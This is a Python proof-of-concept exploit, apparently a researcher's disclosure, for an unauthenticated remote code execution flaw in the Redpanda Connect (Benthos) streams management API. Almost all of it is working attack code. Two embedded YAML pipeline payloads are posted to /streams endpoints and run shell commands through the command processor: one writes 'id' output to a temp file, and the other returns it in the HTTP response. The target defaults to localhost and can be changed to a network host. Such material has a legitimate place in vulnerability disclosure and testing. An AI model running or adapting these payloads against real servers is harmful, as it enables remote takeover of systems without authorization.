#!/usr/bin/env python3
"""
rp_connect_rce PoC - unauthenticated RCE in Redpanda Connect (Benthos) streams-mode management API.
Authorized, non-destructive, self-contained. Standard library only (no pip installs).

CVE: CVE-2026-123270.
Author: Adrian Pastor (GitHub: https://github.com/pagvac)

Verified end-to-end against the official v4.109.0 release binary (latest as of 2026-09-14).
The blind stage runs `id` and writes it plus an RCE_PROOF_<epoch> marker to a temp file.
The in-band stage returns `id`'s output directly in the HTTP response body.
"""
import hashlib, subprocess, tarfile, time, urllib.request

VERSION = "4.109.0"                       # latest release as of 2026-09-14
ASSET   = f"redpanda-connect_{VERSION}_darwin_arm64.tar.gz"   # Linux: ..._linux_amd64.tar.gz
BASE    = f"https://github.com/redpanda-data/connect/releases/download/v{VERSION}"
# Digest published alongside the release (darwin_arm64 v4.109.0):
EXPECTED_SHA256 = "b1dba90ed88e05bc964cb2bec384294561a29cda41c3754c57d2a276be68a3c6"

TARGET = "http://127.0.0.1:4195"          # or http://<target>:4195 over the network
MARKER = "/tmp/rp_connect_rce_marker.txt"

# --- embedded attacker payloads (pipeline configs) -------------------------------------

# Blind: one-shot `generate` input runs the command, output goes to a file on the host.
BLIND_PAYLOAD = """input:
  generate:
    count: 1
    interval: ""
    mapping: 'root = "poc-trigger"'
pipeline:
  processors:
    - command:
        name: sh
        args_mapping: |
          root = [ "-c", "id > /tmp/rp_connect_rce_marker.txt 2>&1; echo RCE_PROOF_$(date +%s) >> /tmp/rp_connect_rce_marker.txt" ]
output:
  drop: {}
"""

# In-band: `http_server` input + `sync_response` output returns command output in the response body.
INBAND_PAYLOAD = """input:
  http_server:
    path: /trigger
pipeline:
  processors:
    - command:
        name: sh
        args_mapping: 'root = [ "-c", "id" ]'
output:
  sync_response: {}
"""


def post(path, body, content_type=None):
    headers = {"Content-Type": content_type} if content_type else {}
    req = urllib.request.Request(TARGET + path, data=body.encode() if isinstance(body, str) else body,
                                 method="POST", headers=headers)
    return urllib.request.urlopen(req)


def main():
    # 1. Obtain and verify the official binary.
    urllib.request.urlretrieve(f"{BASE}/{ASSET}", "rc.tar.gz")
    digest = hashlib.sha256(open("rc.tar.gz", "rb").read()).hexdigest()
    assert digest == EXPECTED_SHA256, f"checksum mismatch: {digest}"
    with tarfile.open("rc.tar.gz") as tar:
        tar.extractall(".")               # extracts the redpanda-connect binary
    print(f"[1] verified official v{VERSION} binary: {digest}")

    # 2. Start the service in its default streams mode (the "victim").
    proc = subprocess.Popen(["./redpanda-connect", "streams"],
                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    time.sleep(4)                          # allow the HTTP listener to bind 0.0.0.0:4195
    try:
        # 3. Confirm unauthenticated reachability (read-only, no payload).
        with urllib.request.urlopen(f"{TARGET}/streams") as r:
            print(f"[3] GET /streams -> HTTP {r.status}  (200 = unauthenticated; 401/403 = auth on)")

        # 4. Blind exploit: one unauthenticated POST creates and runs the pipeline.
        with post("/streams/pwn", BLIND_PAYLOAD, "application/x-yaml") as r:
            print(f"[4] POST /streams/pwn -> HTTP {r.status}, body length {len(r.read())}")
        time.sleep(2)
        print("[5] marker file written by the Connect process (id output + RCE proof):")
        print(open(MARKER).read())

        # 6. In-band exploit: register once, then a single request returns the command output.
        with post("/streams/inband", INBAND_PAYLOAD, "application/x-yaml") as r:
            print(f"[6] POST /streams/inband -> HTTP {r.status}")
        with post("/inband/trigger", b"x") as r:
            print(f"[7] POST /inband/trigger -> HTTP {r.status}, "
                  f"Content-Type {r.headers.get('Content-Type')}, "
                  f"Content-Length {r.headers.get('Content-Length')}")
            print("[7] response body IS the command output (no file read):")
            print(r.read().decode())
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except Exception:
            proc.kill()


if __name__ == "__main__":
    main()
